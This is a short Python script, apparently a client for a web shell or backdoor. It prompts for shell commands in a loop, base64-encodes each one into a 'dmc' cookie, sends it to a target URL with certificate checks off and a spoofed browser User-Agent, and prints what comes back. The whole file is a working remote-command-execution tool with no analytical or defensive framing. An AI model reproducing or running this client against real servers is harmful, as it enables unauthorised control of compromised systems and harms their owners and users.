import requests
import base64
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = sys.argv[1]

while True:
        command = input("Command to Execute: ")
        encoded_command = base64.b64encode(command.encode("ascii")).decode("ascii")
        headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0","Cookie":f"dmc={encoded_command}"}
#       print(headers)
        resp = requests.get(url, headers=headers, verify=False)
#       print(resp.status_code)
        print(resp.text)
